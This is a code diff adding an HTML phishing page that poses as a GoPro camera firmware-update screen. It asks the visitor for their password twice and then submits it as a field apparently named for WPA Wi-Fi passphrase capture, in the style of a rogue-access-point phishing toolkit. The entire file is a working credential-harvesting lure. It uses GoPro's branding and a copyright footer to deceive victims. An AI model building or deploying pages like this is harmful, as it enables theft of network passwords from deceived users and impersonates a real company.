@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>GoPro - Your camera needs an update</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="static/style.css">
+  <script src="static/jquery.min.js"></script>
+</head>
+<body>
+  <center>
+    <img src="static/logo.jpg" width="50%" height="auto" class="logo"><br/> <!--Logo -->
+    <h1 class="needs">Your camera needs an important update</h1>
+    <form>
+      <div>
+          <label for="pwd" class="password-label">Your GoPro Password : </label><br/><!-- Password field -->
+          <input class="form-control" type="password" id="pwd">
+          <label for="pwd2" class="password-label">Repeat Password : </label><br/><!-- Password repeat field -->
+          <input class="form-control" type="password" id="pwd2">
+          <!-- Password not valid -->
+          <div id="dialog">
+            <img src="static/attention.png" width="2%" height="auto" class="attention"><br/>
+            <h2 id="error">Fill all the fields please</h2>
+          </div>
+      </div><br/>
+      <button class="button" id="btn">Start Update</button>
+    </form>
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">© GoPro 2017, All Rights Reserved.</p>
+    </div>
+  </footer>
+  </center>
+  <!-- End footer -->
+    <script>
+      /*
+      Check the password field and act accordingly.
+      */
+
+      $("#btn").on("click", function(e) {
+          e.preventDefault();
+          // get the password box and checkbox elements
+          var input = document.getElementById("pwd");
+          var input2 = document.getElementById("pwd2");
+          // check to see if the value is empty
+          if ( input.value == "" ){
+              passNotValid();
+          }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+              passNotValid();
+          }else if( input2.value != input.value ){ //check if the passwords don't match
+              passDontMatch();
+          }else{
+              // post the data
+              $("#dialog").css('display', 'none');
+              post('post', {"wfphshr-wpa-password": input.value});
+          }
+      });
+
+      function passNotValid(){
+        $("#dialog").css('display', 'block');
+      }
+
+      function passDontMatch(){
+        $("#dialog").css('display', 'block');
+        document.getElementById("error").innerHTML="Passwords don't match!";
+      }
+      /*
+      Post to the fallowing path given the parameters.
+
+      Args:
+        path: The path to be posted to.
+        params: The parameters to be passed.
+      */
+      function post(path, params) {
+        // create a form and set its attributes
+        var form = document.createElement("form");
+        form.setAttribute("method", "post");
+        form.setAttribute("action", path);
+
+        // set the attribute for the post
+        for(var key in params) {
+            if(params.hasOwnProperty(key)) {
+                var hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+                form.appendChild(hiddenField);
+             }
+        }
+        // submit the post
+        document.body.appendChild(form);
+        form.submit();
+      }
+      var input = document.getElementById("pwd");
+      var input2 = document.getElementById("pwd2");
+      input.disabled = false;
+      input2.disabled = false;
+    </script>
+</body>
+</html>
